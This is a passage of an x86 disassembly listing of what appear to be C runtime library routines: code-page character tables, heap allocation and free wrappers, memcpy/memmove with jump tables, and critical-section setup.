  424050:	mov    al,BYTE PTR [edx]
  424052:	inc    edx
  424053:	test   al,al
  424055:	jne    0x424028
  424057:	pop    edi
  424058:	pop    ebx
  424059:	push   0x0
  42405b:	push   DWORD PTR ds:0x45cf14
  424061:	lea    eax,[ebp-0x518]
  424067:	push   DWORD PTR ds:0x45d024
  42406d:	push   eax
  42406e:	push   esi
  42406f:	lea    eax,[ebp-0x118]
  424075:	push   eax
  424076:	push   0x1
  424078:	call   0x425f88
  42407d:	push   0x0
  42407f:	push   DWORD PTR ds:0x45d024
  424085:	lea    eax,[ebp-0x218]
  42408b:	push   esi
  42408c:	push   eax
  42408d:	push   esi
  42408e:	lea    eax,[ebp-0x118]
  424094:	push   eax
  424095:	push   esi
  424096:	push   DWORD PTR ds:0x45cf14
  42409c:	call   0x425bcc
  4240a1:	push   0x0
  4240a3:	push   DWORD PTR ds:0x45d024
  4240a9:	lea    eax,[ebp-0x318]
  4240af:	push   esi
  4240b0:	push   eax
  4240b1:	push   esi
  4240b2:	lea    eax,[ebp-0x118]
  4240b8:	push   eax
  4240b9:	push   0x200
  4240be:	push   DWORD PTR ds:0x45cf14
  4240c4:	call   0x425bcc
  4240c9:	add    esp,0x5c
  4240cc:	xor    eax,eax
  4240ce:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4240d6:	test   cl,0x1
  4240d9:	je     0x4240f1
  4240db:	or     BYTE PTR [eax+0x45cf21],0x10
  4240e2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4240e9:	mov    BYTE PTR [eax+0x45d040],cl
  4240ef:	jmp    0x42410d
  4240f1:	test   cl,0x2
  4240f4:	je     0x424106
  4240f6:	or     BYTE PTR [eax+0x45cf21],0x20
  4240fd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424104:	jmp    0x4240e9
  424106:	and    BYTE PTR [eax+0x45d040],0x0
  42410d:	inc    eax
  42410e:	cmp    eax,esi
  424110:	jb     0x4240ce
  424112:	jmp    0x424158
  424114:	xor    eax,eax
  424116:	cmp    eax,0x41
  424119:	jb     0x424134
  42411b:	cmp    eax,0x5a
  42411e:	ja     0x424134
  424120:	or     BYTE PTR [eax+0x45cf21],0x10
  424127:	mov    cl,al
  424129:	add    cl,0x20
  42412c:	mov    BYTE PTR [eax+0x45d040],cl
  424132:	jmp    0x424153
  424134:	cmp    eax,0x61
  424137:	jb     0x42414c
  424139:	cmp    eax,0x7a
  42413c:	ja     0x42414c
  42413e:	or     BYTE PTR [eax+0x45cf21],0x20
  424145:	mov    cl,al
  424147:	sub    cl,0x20
  42414a:	jmp    0x42412c
  42414c:	and    BYTE PTR [eax+0x45d040],0x0
  424153:	inc    eax
  424154:	cmp    eax,esi
  424156:	jb     0x424116
  424158:	mov    ecx,DWORD PTR [ebp-0x4]
  42415b:	xor    ecx,DWORD PTR [ebp+0x4]
  42415e:	pop    esi
  42415f:	call   0x423f2c
  424164:	leave  
  424165:	ret    
  424166:	push   ebp
  424167:	mov    ebp,esp
  424169:	sub    esp,0x1c
  42416c:	mov    eax,ds:0x45c430
  424171:	xor    eax,DWORD PTR [ebp+0x4]
  424174:	push   ebx
  424175:	push   esi
  424176:	mov    esi,DWORD PTR [ebp+0x8]
  424179:	xor    ebx,ebx
  42417b:	cmp    esi,ebx
  42417d:	mov    DWORD PTR [ebp-0x4],eax
  424180:	push   edi
  424181:	je     0x4242db
  424187:	xor    edx,edx
  424189:	xor    eax,eax
  42418b:	cmp    DWORD PTR [eax+0x45c440],esi
  424191:	je     0x4241f8
  424193:	add    eax,0x30
  424196:	inc    edx
  424197:	cmp    eax,0xf0
  42419c:	jb     0x42418b
  42419e:	lea    eax,[ebp-0x1c]
  4241a1:	push   eax
  4241a2:	push   esi
  4241a3:	call   DWORD PTR ds:0x4280a0
  4241a9:	cmp    eax,0x1
  4241ac:	jne    0x4242d3
  4241b2:	push   0x40
  4241b4:	xor    eax,eax
  4241b6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4241ba:	pop    ecx
  4241bb:	mov    edi,0x45cf20
  4241c0:	rep stos DWORD PTR es:[edi],eax
  4241c2:	stos   BYTE PTR es:[edi],al
  4241c3:	mov    DWORD PTR ds:0x45d024,esi
  4241c9:	mov    DWORD PTR ds:0x45cf14,ebx
  4241cf:	jbe    0x4242c1
  4241d5:	cmp    BYTE PTR [ebp-0x16],0x0
  4241d9:	je     0x424299
  4241df:	lea    ecx,[ebp-0x15]
  4241e2:	mov    dl,BYTE PTR [ecx]
  4241e4:	test   dl,dl
  4241e6:	je     0x424299
  4241ec:	movzx  eax,BYTE PTR [ecx-0x1]
  4241f0:	movzx  edx,dl
  4241f3:	jmp    0x424289
  4241f8:	push   0x40
  4241fa:	xor    eax,eax
  4241fc:	pop    ecx
  4241fd:	mov    edi,0x45cf20
  424202:	rep stos DWORD PTR es:[edi],eax
  424204:	lea    ecx,[edx+edx*2]
  424207:	shl    ecx,0x4
  42420a:	mov    DWORD PTR [ebp-0x8],ebx
  42420d:	stos   BYTE PTR es:[edi],al
  42420e:	lea    ebx,[ecx+0x45c450]
  424214:	mov    al,BYTE PTR [ebx]
  424216:	mov    esi,ebx
  424218:	jmp    0x424243
  42421a:	mov    dl,BYTE PTR [esi+0x1]
  42421d:	test   dl,dl
  42421f:	je     0x424247
  424221:	movzx  eax,al
  424224:	movzx  edi,dl
  424227:	cmp    eax,edi
  424229:	ja     0x42423f
  42422b:	mov    edx,DWORD PTR [ebp-0x8]
  42422e:	mov    dl,BYTE PTR [edx+0x45c438]
  424234:	or     BYTE PTR [eax+0x45cf21],dl
  42423a:	inc    eax
  42423b:	cmp    eax,edi
  42423d:	jbe    0x424234
  42423f:	inc    esi
  424240:	inc    esi
  424241:	mov    al,BYTE PTR [esi]
  424243:	test   al,al
  424245:	jne    0x42421a
  424247:	inc    DWORD PTR [ebp-0x8]
  42424a:	add    ebx,0x8
  42424d:	cmp    DWORD PTR [ebp-0x8],0x4
  424251:	jb     0x424214
  424253:	mov    eax,DWORD PTR [ebp+0x8]
  424256:	mov    ds:0x45d024,eax
  42425b:	mov    DWORD PTR ds:0x45cf1c,0x1
  424265:	call   0x423f7c
  42426a:	lea    ecx,[ecx+0x45c444]
  424270:	mov    esi,ecx
  424272:	mov    edi,0x45d030
  424277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424279:	mov    ds:0x45cf14,eax
  42427e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42427f:	jmp    0x4242e0
  424281:	or     BYTE PTR [eax+0x45cf21],0x4
  424288:	inc    eax
  424289:	cmp    eax,edx
  42428b:	jbe    0x424281
  42428d:	inc    ecx
  42428e:	inc    ecx
  42428f:	cmp    BYTE PTR [ecx-0x1],0x0
  424293:	jne    0x4241e2
  424299:	xor    ecx,ecx
  42429b:	inc    ecx
  42429c:	mov    eax,ecx
  42429e:	or     BYTE PTR [eax+0x45cf21],0x8
  4242a5:	inc    eax
  4242a6:	cmp    eax,0xff
  4242ab:	jb     0x42429e
  4242ad:	mov    eax,esi
  4242af:	call   0x423f7c
  4242b4:	mov    ds:0x45cf14,eax
  4242b9:	mov    DWORD PTR ds:0x45cf1c,ecx
  4242bf:	jmp    0x4242c7
  4242c1:	mov    DWORD PTR ds:0x45cf1c,ebx
  4242c7:	xor    eax,eax
  4242c9:	mov    edi,0x45d030
  4242ce:	stos   DWORD PTR es:[edi],eax
  4242cf:	stos   DWORD PTR es:[edi],eax
  4242d0:	stos   DWORD PTR es:[edi],eax
  4242d1:	jmp    0x4242e0
  4242d3:	cmp    DWORD PTR ds:0x45cd84,ebx
  4242d9:	je     0x4242e9
  4242db:	call   0x423fab
  4242e0:	call   0x423fd4
  4242e5:	xor    eax,eax
  4242e7:	jmp    0x4242ec
  4242e9:	or     eax,0xffffffff
  4242ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4242ef:	xor    ecx,DWORD PTR [ebp+0x4]
  4242f2:	pop    edi
  4242f3:	pop    esi
  4242f4:	pop    ebx
  4242f5:	call   0x423f2c
  4242fa:	leave  
  4242fb:	ret    
  4242fc:	push   0x14
  4242fe:	push   0x428550
  424303:	call   0x423858
  424308:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42430c:	push   0xd
  42430e:	call   0x423a1f
  424313:	pop    ecx
  424314:	xor    edi,edi
  424316:	mov    DWORD PTR [ebp-0x4],edi
  424319:	mov    DWORD PTR ds:0x45cd84,edi
  42431f:	mov    eax,DWORD PTR [ebp+0x8]
  424322:	cmp    eax,0xfffffffe
  424325:	jne    0x424339
  424327:	mov    DWORD PTR ds:0x45cd84,0x1
  424331:	call   DWORD PTR ds:0x42809c
  424337:	jmp    0x424364
  424339:	cmp    eax,0xfffffffd
  42433c:	jne    0x424350
  42433e:	mov    DWORD PTR ds:0x45cd84,0x1
  424348:	call   DWORD PTR ds:0x428098
  42434e:	jmp    0x424364
  424350:	cmp    eax,0xfffffffc
  424353:	jne    0x424364
  424355:	mov    DWORD PTR ds:0x45cd84,0x1
  42435f:	mov    eax,ds:0x45cdb4
  424364:	mov    DWORD PTR [ebp+0x8],eax
  424367:	cmp    eax,DWORD PTR ds:0x45d024
  42436d:	je     0x42442e
  424373:	mov    esi,DWORD PTR ds:0x45cf18
  424379:	mov    DWORD PTR [ebp-0x20],esi
  42437c:	cmp    esi,edi
  42437e:	je     0x424384
  424380:	cmp    DWORD PTR [esi],edi
  424382:	je     0x424394
  424384:	push   0x220
  424389:	call   0x424582
  42438e:	pop    ecx
  42438f:	mov    esi,eax
  424391:	mov    DWORD PTR [ebp-0x20],esi
  424394:	cmp    esi,edi
  424396:	je     0x424417
  424398:	push   DWORD PTR [ebp+0x8]
  42439b:	call   0x424166
  4243a0:	pop    ecx
  4243a1:	mov    DWORD PTR [ebp-0x1c],eax
  4243a4:	cmp    eax,edi
  4243a6:	jne    0x424417
  4243a8:	mov    DWORD PTR [esi],edi
  4243aa:	mov    eax,ds:0x45d024
  4243af:	mov    DWORD PTR [esi+0x4],eax
  4243b2:	mov    eax,ds:0x45cf1c
  4243b7:	mov    DWORD PTR [esi+0x8],eax
  4243ba:	mov    eax,ds:0x45cf14
  4243bf:	mov    DWORD PTR [esi+0xc],eax
  4243c2:	xor    eax,eax
  4243c4:	mov    DWORD PTR [ebp-0x24],eax
  4243c7:	cmp    eax,0x5
  4243ca:	jge    0x4243dc
  4243cc:	mov    cx,WORD PTR [eax*2+0x45d030]
  4243d4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4243d9:	inc    eax
  4243da:	jmp    0x4243c4
  4243dc:	xor    eax,eax
  4243de:	mov    DWORD PTR [ebp-0x24],eax
  4243e1:	cmp    eax,0x101
  4243e6:	jge    0x4243f5
  4243e8:	mov    cl,BYTE PTR [eax+0x45cf20]
  4243ee:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4243f2:	inc    eax
  4243f3:	jmp    0x4243de
  4243f5:	xor    eax,eax
  4243f7:	mov    DWORD PTR [ebp-0x24],eax
  4243fa:	cmp    eax,0x100
  4243ff:	jge    0x424411
  424401:	mov    cl,BYTE PTR [eax+0x45d040]
  424407:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42440e:	inc    eax
  42440f:	jmp    0x4243f7
  424411:	mov    DWORD PTR ds:0x45cf18,esi
  424417:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42441b:	jne    0x424431
  42441d:	cmp    esi,DWORD PTR ds:0x45cf18
  424423:	je     0x424431
  424425:	push   esi
  424426:	call   0x42446a
  42442b:	pop    ecx
  42442c:	jmp    0x424431
  42442e:	mov    DWORD PTR [ebp-0x1c],edi
  424431:	or     DWORD PTR [ebp-0x4],0xffffffff
  424435:	call   0x424443
  42443a:	mov    eax,DWORD PTR [ebp-0x1c]
  42443d:	call   0x423893
  424442:	ret    
  424443:	push   0xd
  424445:	call   0x42398b
  42444a:	pop    ecx
  42444b:	ret    
  42444c:	cmp    DWORD PTR ds:0x45d26c,0x0
  424453:	jne    0x424467
  424455:	push   0xfffffffd
  424457:	call   0x4242fc
  42445c:	pop    ecx
  42445d:	mov    DWORD PTR ds:0x45d26c,0x1
  424467:	xor    eax,eax
  424469:	ret    
  42446a:	push   0xc
  42446c:	push   0x428560
  424471:	call   0x423858
  424476:	mov    esi,DWORD PTR [ebp+0x8]
  424479:	test   esi,esi
  42447b:	je     0x4244d5
  42447d:	cmp    DWORD PTR ds:0x45d144,0x3
  424484:	jne    0x4244c6
  424486:	push   0x4
  424488:	call   0x423a1f
  42448d:	pop    ecx
  42448e:	and    DWORD PTR [ebp-0x4],0x0
  424492:	push   esi
  424493:	call   0x424c42
  424498:	pop    ecx
  424499:	mov    DWORD PTR [ebp-0x1c],eax
  42449c:	test   eax,eax
  42449e:	je     0x4244a9
  4244a0:	push   esi
  4244a1:	push   eax
  4244a2:	call   0x424c6d
  4244a7:	pop    ecx
  4244a8:	pop    ecx
  4244a9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244ad:	call   0x4244bd
  4244b2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4244b6:	jne    0x4244d5
  4244b8:	push   DWORD PTR [ebp+0x8]
  4244bb:	jmp    0x4244c7
  4244bd:	push   0x4
  4244bf:	call   0x42398b
  4244c4:	pop    ecx
  4244c5:	ret    
  4244c6:	push   esi
  4244c7:	push   0x0
  4244c9:	push   DWORD PTR ds:0x45d140
  4244cf:	call   DWORD PTR ds:0x428088
  4244d5:	call   0x423893
  4244da:	ret    
  4244db:	push   0xc
  4244dd:	push   0x428570
  4244e2:	call   0x423858
  4244e7:	mov    esi,DWORD PTR [ebp+0x8]
  4244ea:	cmp    DWORD PTR ds:0x45d144,0x3
  4244f1:	jne    0x424521
  4244f3:	cmp    esi,DWORD PTR ds:0x45cf04
  4244f9:	ja     0x424521
  4244fb:	push   0x4
  4244fd:	call   0x423a1f
  424502:	pop    ecx
  424503:	and    DWORD PTR [ebp-0x4],0x0
  424507:	push   esi
  424508:	call   0x425421
  42450d:	pop    ecx
  42450e:	mov    DWORD PTR [ebp-0x1c],eax
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x42454d
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	test   eax,eax
  42451f:	jne    0x424544
  424521:	test   esi,esi
  424523:	jne    0x424526
  424525:	inc    esi
  424526:	cmp    DWORD PTR ds:0x45d144,0x1
  42452d:	je     0x424535
  42452f:	add    esi,0xf
  424532:	and    esi,0xfffffff0
  424535:	push   esi
  424536:	push   0x0
  424538:	push   DWORD PTR ds:0x45d140
  42453e:	call   DWORD PTR ds:0x4280a4
  424544:	call   0x423893
  424549:	ret    
  42454a:	mov    esi,DWORD PTR [ebp+0x8]
  42454d:	push   0x4
  42454f:	call   0x42398b
  424554:	pop    ecx
  424555:	ret    
  424556:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42455b:	ja     0x42457f
  42455d:	push   DWORD PTR [esp+0x4]
  424561:	call   0x4244db
  424566:	test   eax,eax
  424568:	pop    ecx
  424569:	jne    0x424581
  42456b:	cmp    DWORD PTR [esp+0x8],eax
  42456f:	je     0x424581
  424571:	push   DWORD PTR [esp+0x4]
  424575:	call   0x426142
  42457a:	test   eax,eax
  42457c:	pop    ecx
  42457d:	jne    0x42455d
  42457f:	xor    eax,eax
  424581:	ret    
  424582:	push   DWORD PTR ds:0x45cdc8
  424588:	push   DWORD PTR [esp+0x8]
  42458c:	call   0x424556
  424591:	pop    ecx
  424592:	pop    ecx
  424593:	ret    
  424594:	int3   
  424595:	int3   
  424596:	int3   
  424597:	int3   
  424598:	int3   
  424599:	int3   
  42459a:	int3   
  42459b:	int3   
  42459c:	int3   
  42459d:	int3   
  42459e:	int3   
  42459f:	int3   
  4245a0:	push   ebp
  4245a1:	mov    ebp,esp
  4245a3:	push   edi
  4245a4:	push   esi
  4245a5:	mov    esi,DWORD PTR [ebp+0xc]
  4245a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245ab:	mov    edi,DWORD PTR [ebp+0x8]
  4245ae:	mov    eax,ecx
  4245b0:	mov    edx,ecx
  4245b2:	add    eax,esi
  4245b4:	cmp    edi,esi
  4245b6:	jbe    0x4245c0
  4245b8:	cmp    edi,eax
  4245ba:	jb     0x42473c
  4245c0:	test   edi,0x3
  4245c6:	jne    0x4245dc
  4245c8:	shr    ecx,0x2
  4245cb:	and    edx,0x3
  4245ce:	cmp    ecx,0x8
  4245d1:	jb     0x4245fc
  4245d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d5:	jmp    DWORD PTR [edx*4+0x4246ec]
  4245dc:	mov    eax,edi
  4245de:	mov    edx,0x3
  4245e3:	sub    ecx,0x4
  4245e6:	jb     0x4245f4
  4245e8:	and    eax,0x3
  4245eb:	add    ecx,eax
  4245ed:	jmp    DWORD PTR [eax*4+0x424600]
  4245f4:	jmp    DWORD PTR [ecx*4+0x4246fc]
  4245fb:	nop
  4245fc:	jmp    DWORD PTR [ecx*4+0x424680]
  424603:	nop
  424604:	adc    BYTE PTR [esi+0x42],al
  424607:	add    BYTE PTR [esi+eax*2],bh
  42460a:	inc    edx
  42460b:	add    BYTE PTR [eax+0x46],ah
  42460e:	inc    edx
  42460f:	add    BYTE PTR [ebx],ah
  424611:	ror    DWORD PTR [edx-0x75f877fa],1
  424617:	inc    esi
  424618:	add    DWORD PTR [eax+0x468a0147],ecx
  42461e:	add    al,cl
  424620:	jmp    0x289ce27
  424625:	add    esi,0x3
  424628:	add    edi,0x3
  42462b:	cmp    ecx,0x8
  42462e:	jb     0x4245fc
  424630:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424632:	jmp    DWORD PTR [edx*4+0x4246ec]
  424639:	lea    ecx,[ecx+0x0]
  42463c:	and    edx,ecx
  42463e:	mov    al,BYTE PTR [esi]
  424640:	mov    BYTE PTR [edi],al
  424642:	mov    al,BYTE PTR [esi+0x1]
  424645:	shr    ecx,0x2
  424648:	mov    BYTE PTR [edi+0x1],al
  42464b:	add    esi,0x2
  42464e:	add    edi,0x2
  424651:	cmp    ecx,0x8
  424654:	jb     0x4245fc
  424656:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424658:	jmp    DWORD PTR [edx*4+0x4246ec]
  42465f:	nop
  424660:	and    edx,ecx
  424662:	mov    al,BYTE PTR [esi]
  424664:	mov    BYTE PTR [edi],al
  424666:	add    esi,0x1
  424669:	shr    ecx,0x2
  42466c:	add    edi,0x1
  42466f:	cmp    ecx,0x8
  424672:	jb     0x4245fc
  424674:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424676:	jmp    DWORD PTR [edx*4+0x4246ec]
  42467d:	lea    ecx,[ecx+0x0]
  424680:	jecxz  0x4246c8
  424682:	inc    edx
  424683:	add    al,dl
  424685:	inc    esi
  424686:	inc    edx
  424687:	add    al,cl
  424689:	inc    esi
  42468a:	inc    edx
  42468b:	add    al,al
  42468d:	inc    esi
  42468e:	inc    edx
  42468f:	add    BYTE PTR [eax-0x4fffbdba],bh
  424695:	inc    esi
  424696:	inc    edx
  424697:	add    BYTE PTR [eax-0x5fffbdba],ch
  42469d:	inc    esi
  42469e:	inc    edx
  42469f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246a5:	inc    esp
  4246a6:	(bad)  
  4246a7:	in     al,0x8b
  4246a9:	inc    esp
  4246aa:	mov    gs,eax
  4246ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4246b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4246b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4246b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4246bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4246c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4246c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4246c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4246cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4246d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4246d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4246d8:	lea    eax,[ecx*4+0x0]
  4246df:	add    esi,eax
  4246e1:	add    edi,eax
  4246e3:	jmp    DWORD PTR [edx*4+0x4246ec]
  4246ea:	mov    edi,edi
  4246ec:	cld    
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [edi+eax*2],al
  4246f2:	inc    edx
  4246f3:	add    BYTE PTR [eax],dl
  4246f5:	inc    edi
  4246f6:	inc    edx
  4246f7:	add    BYTE PTR [edi+eax*2],ah
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424701:	leave  
  424702:	ret    
  424703:	nop
  424704:	mov    al,BYTE PTR [esi]
  424706:	mov    BYTE PTR [edi],al
  424708:	mov    eax,DWORD PTR [ebp+0x8]
  42470b:	pop    esi
  42470c:	pop    edi
  42470d:	leave  
  42470e:	ret    
  42470f:	nop
  424710:	mov    al,BYTE PTR [esi]
  424712:	mov    BYTE PTR [edi],al
  424714:	mov    al,BYTE PTR [esi+0x1]
  424717:	mov    BYTE PTR [edi+0x1],al
  42471a:	mov    eax,DWORD PTR [ebp+0x8]
  42471d:	pop    esi
  42471e:	pop    edi
  42471f:	leave  
  424720:	ret    
  424721:	lea    ecx,[ecx+0x0]
  424724:	mov    al,BYTE PTR [esi]
  424726:	mov    BYTE PTR [edi],al
  424728:	mov    al,BYTE PTR [esi+0x1]
  42472b:	mov    BYTE PTR [edi+0x1],al
  42472e:	mov    al,BYTE PTR [esi+0x2]
  424731:	mov    BYTE PTR [edi+0x2],al
  424734:	mov    eax,DWORD PTR [ebp+0x8]
  424737:	pop    esi
  424738:	pop    edi
  424739:	leave  
  42473a:	ret    
  42473b:	nop
  42473c:	lea    esi,[ecx+esi*1-0x4]
  424740:	lea    edi,[ecx+edi*1-0x4]
  424744:	test   edi,0x3
  42474a:	jne    0x424770
  42474c:	shr    ecx,0x2
  42474f:	and    edx,0x3
  424752:	cmp    ecx,0x8
  424755:	jb     0x424764
  424757:	std    
  424758:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475a:	cld    
  42475b:	jmp    DWORD PTR [edx*4+0x424888]
  424762:	mov    edi,edi
  424764:	neg    ecx
  424766:	jmp    DWORD PTR [ecx*4+0x424838]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	mov    eax,edi
  424772:	mov    edx,0x3
  424777:	cmp    ecx,0x4
  42477a:	jb     0x424788
  42477c:	and    eax,0x3
  42477f:	sub    ecx,eax
  424781:	jmp    DWORD PTR [eax*4+0x42478c]
  424788:	jmp    DWORD PTR [ecx*4+0x424888]
  42478f:	nop
  424790:	pushf  
  424791:	inc    edi
  424792:	inc    edx
  424793:	add    al,al
  424795:	inc    edi
  424796:	inc    edx
  424797:	add    al,ch
  424799:	inc    edi
  42479a:	inc    edx
  42479b:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247a1:	mov    BYTE PTR [edi+0x3],al
  4247a4:	sub    esi,0x1
  4247a7:	shr    ecx,0x2
  4247aa:	sub    edi,0x1
  4247ad:	cmp    ecx,0x8
  4247b0:	jb     0x424764
  4247b2:	std    
  4247b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b5:	cld    
  4247b6:	jmp    DWORD PTR [edx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    al,BYTE PTR [esi+0x3]
  4247c3:	and    edx,ecx
  4247c5:	mov    BYTE PTR [edi+0x3],al
  4247c8:	mov    al,BYTE PTR [esi+0x2]
  4247cb:	shr    ecx,0x2
  4247ce:	mov    BYTE PTR [edi+0x2],al
  4247d1:	sub    esi,0x2
  4247d4:	sub    edi,0x2
  4247d7:	cmp    ecx,0x8
  4247da:	jb     0x424764
  4247dc:	std    
  4247dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247df:	cld    
  4247e0:	jmp    DWORD PTR [edx*4+0x424888]
  4247e7:	nop
  4247e8:	mov    al,BYTE PTR [esi+0x3]
  4247eb:	and    edx,ecx
  4247ed:	mov    BYTE PTR [edi+0x3],al
  4247f0:	mov    al,BYTE PTR [esi+0x2]
  4247f3:	mov    BYTE PTR [edi+0x2],al
  4247f6:	mov    al,BYTE PTR [esi+0x1]
  4247f9:	shr    ecx,0x2
  4247fc:	mov    BYTE PTR [edi+0x1],al
  4247ff:	sub    esi,0x3
  424802:	sub    edi,0x3
  424805:	cmp    ecx,0x8
  424808:	jb     0x424764
  42480e:	std    
  42480f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424811:	cld    
  424812:	jmp    DWORD PTR [edx*4+0x424888]
  424819:	lea    ecx,[ecx+0x0]
  42481c:	cmp    al,0x48
  42481e:	inc    edx
  42481f:	add    BYTE PTR [eax+ecx*2+0x42],al
  424823:	add    BYTE PTR [eax+ecx*2+0x42],cl
  424827:	add    BYTE PTR [eax+ecx*2+0x42],dl
  42482b:	add    BYTE PTR [eax+ecx*2+0x42],bl
  42482f:	add    BYTE PTR [eax+ecx*2+0x42],ah
  424833:	add    BYTE PTR [eax+ecx*2+0x42],ch
  424837:	add    BYTE PTR [edi+0x48],bh
  42483a:	inc    edx
  42483b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424841:	inc    esp
  424842:	(bad)  
  424843:	sbb    al,0x8b
  424845:	inc    esp
  424846:	mov    ds,WORD PTR [eax]
  424848:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42484c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424850:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424854:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424858:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42485c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424860:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424864:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424868:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42486c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424870:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424874:	lea    eax,[ecx*4+0x0]
  42487b:	add    esi,eax
  42487d:	add    edi,eax
  42487f:	jmp    DWORD PTR [edx*4+0x424888]
  424886:	mov    edi,edi
  424888:	cwde   
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [eax-0x4fffbdb8],ah
  424891:	dec    eax
  424892:	inc    edx
  424893:	add    ah,al
  424895:	dec    eax
  424896:	inc    edx
  424897:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42489d:	leave  
  42489e:	ret    
  42489f:	nop
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	mov    BYTE PTR [edi+0x3],al
  4248a6:	mov    eax,DWORD PTR [ebp+0x8]
  4248a9:	pop    esi
  4248aa:	pop    edi
  4248ab:	leave  
  4248ac:	ret    
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	mov    BYTE PTR [edi+0x3],al
  4248b6:	mov    al,BYTE PTR [esi+0x2]
  4248b9:	mov    BYTE PTR [edi+0x2],al
  4248bc:	mov    eax,DWORD PTR [ebp+0x8]
  4248bf:	pop    esi
  4248c0:	pop    edi
  4248c1:	leave  
  4248c2:	ret    
  4248c3:	nop
  4248c4:	mov    al,BYTE PTR [esi+0x3]
  4248c7:	mov    BYTE PTR [edi+0x3],al
  4248ca:	mov    al,BYTE PTR [esi+0x2]
  4248cd:	mov    BYTE PTR [edi+0x2],al
  4248d0:	mov    al,BYTE PTR [esi+0x1]
  4248d3:	mov    BYTE PTR [edi+0x1],al
  4248d6:	mov    eax,DWORD PTR [ebp+0x8]
  4248d9:	pop    esi
  4248da:	pop    edi
  4248db:	leave  
  4248dc:	ret    
  4248dd:	push   DWORD PTR [esp+0x4]
  4248e1:	call   DWORD PTR ds:0x4280a8
  4248e7:	xor    eax,eax
  4248e9:	inc    eax
  4248ea:	ret    0x8
  4248ed:	push   0x10
  4248ef:	push   0x4285b8
  4248f4:	call   0x423858
  4248f9:	mov    eax,ds:0x45cd88
  4248fe:	test   eax,eax
  424900:	jne    0x424939
  424902:	cmp    DWORD PTR ds:0x45cac4,0x1
  424909:	je     0x42492f
  42490b:	push   0x4285a4
  424910:	call   DWORD PTR ds:0x428014
  424916:	test   eax,eax
  424918:	je     0x42492f
  42491a:	push   0x42857c
  42491f:	push   eax
  424920:	call   DWORD PTR ds:0x428018
  424926:	mov    ds:0x45cd88,eax
  42492b:	test   eax,eax
  42492d:	jne    0x424939
  42492f:	mov    eax,0x4248dd
  424934:	mov    ds:0x45cd88,eax
  424939:	and    DWORD PTR [ebp-0x4],0x0
  42493d:	push   DWORD PTR [ebp+0xc]
  424940:	push   DWORD PTR [ebp+0x8]
  424943:	call   eax
  424945:	mov    DWORD PTR [ebp-0x1c],eax
  424948:	jmp    0x42496e
  42494a:	mov    eax,DWORD PTR [ebp-0x14]
  42494d:	mov    eax,DWORD PTR [eax]
  42494f:	mov    eax,DWORD PTR [eax]
  424951:	mov    DWORD PTR [ebp-0x20],eax
  424954:	xor    eax,eax
  424956:	inc    eax
  424957:	ret    
  424958:	mov    esp,DWORD PTR [ebp-0x18]
  42495b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424962:	jne    0x42496c
  424964:	push   0x8
  424966:	call   DWORD PTR ds:0x428068
  42496c:	xor    eax,eax
